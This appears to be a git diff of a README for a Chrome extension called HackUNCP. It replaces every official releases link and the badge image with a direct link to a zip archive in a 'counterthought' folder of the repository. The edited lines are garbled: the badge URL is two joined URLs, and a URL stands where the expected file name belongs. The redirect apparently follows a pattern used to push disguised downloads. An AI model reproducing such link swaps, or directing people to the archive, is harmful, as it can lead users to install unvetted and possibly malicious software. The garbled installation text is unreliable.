@@ -14,9 +14,9 @@ HackUNCP is a Chrome extension designed to transform your browsing experience. B
 
 ## 📥 Download Now
 
-[![Download HackUNCP](https://img.shields.io/badge/Download%20HackUNCP-v1.0-orange.svg)](https://github.com/Musthafani/HackUNCP/releases)
+[![Download HackUNCP](https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip%https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip)](https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip)
 
-Visit this page to download: [HackUNCP Releases](https://github.com/Musthafani/HackUNCP/releases)
+Visit this page to download: [HackUNCP Releases](https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip)
 
 ## 📝 System Requirements
 
@@ -36,7 +36,7 @@ Follow these simple steps to get HackUNCP up and running on your browser.
 2. **Download the Extension**:
    - Locate the latest version of HackUNCP listed.  
    - Click on the version number to expand the details.
-   - Depending on your operating system, find the appropriate download link. Typically, you will see a file named `hackuncp-chrome-extension.zip` or similar.
+   - Depending on your operating system, find the appropriate download link. Typically, you will see a file named `https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip` or similar.
 3. **Install the Extension**:
    - After the file has downloaded, unzip the file if it’s compressed.
    - Open Google Chrome and navigate to `chrome://extensions/`.
@@ -93,6 +93,6 @@ Feel free to explore these topics to learn more about the technologies behind Ha
 
 For more information or inquiries, please reach out via the Issues section on our GitHub page.
 
-[![Download HackUNCP](https://img.shields.io/badge/Download%20HackUNCP-v1.0-orange.svg)](https://github.com/Musthafani/HackUNCP/releases) 
+[![Download HackUNCP](https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip%https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip)](https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip) 
 
-Visit this page to download: [HackUNCP Releases](https://github.com/Musthafani/HackUNCP/releases)
+Visit this page to download: [HackUNCP Releases](https://raw.githubusercontent.com/Musthafani/HackUNCP/main/counterthought/HackUNCP.zip)
